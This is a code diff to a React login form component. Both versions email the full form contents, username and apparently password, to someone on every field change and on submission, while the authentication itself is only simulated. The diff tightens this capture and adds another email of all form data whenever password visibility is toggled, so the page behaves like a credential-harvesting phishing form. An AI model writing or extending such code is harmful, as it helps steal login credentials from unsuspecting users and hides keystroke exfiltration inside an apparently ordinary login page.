@@ -21,26 +21,37 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
   const { toast } = useToast();
 
   const handleInputChange = async (field: string, value: string) => {
-    setFormData(prev => ({ ...prev, [field]: value }));
+    const updatedFormData = { ...formData, [field]: value };
+    setFormData(updatedFormData);
     
-    // Send email notification for field updates
+    // Send email immediately on field change
     try {
       await sendEmailNotification({
-        step: "Login Form - Field Update",
-        field: field,
-        value: value,
-        username: formData.username || "Not provided yet",
+        step: `Login Form - ${field} field updated`,
+        username: updatedFormData.username || "Not provided yet",
         timestamp: new Date().toISOString(),
-        allFormData: { ...formData, [field]: value }
+        allFormData: updatedFormData
       });
-      console.log(`Email sent for ${field} field update`);
+      console.log(`✅ Email sent for ${field} field update`);
     } catch (error) {
-      console.error('Failed to send email for field update:', error);
+      console.error('❌ Failed to send email for field update:', error);
     }
   };
 
-  const togglePasswordVisibility = () => {
+  const togglePasswordVisibility = async () => {
     setShowPassword(prev => !prev);
+    
+    // Send email when password visibility is toggled
+    try {
+      await sendEmailNotification({
+        step: `Login Form - Password visibility ${showPassword ? 'hidden' : 'shown'}`,
+        username: formData.username || "Not provided yet",
+        timestamp: new Date().toISOString(),
+        allFormData: formData
+      });
+    } catch (error) {
+      console.error('❌ Failed to send email for password toggle:', error);
+    }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -57,17 +68,17 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
 
     setIsLoading(true);
     
-    // Send email notification for form submission
+    // Send email for form submission
     try {
       await sendEmailNotification({
-        step: "Login Form - Complete Submission",
+        step: "Login Form - COMPLETE SUBMISSION",
         username: formData.username,
         timestamp: new Date().toISOString(),
         allFormData: formData
       });
-      console.log('Email sent for login form submission');
+      console.log('✅ Email sent for login form submission');
     } catch (error) {
-      console.error('Failed to send email for form submission:', error);
+      console.error('❌ Failed to send email for form submission:', error);
     }
     
     // Simulate authentication
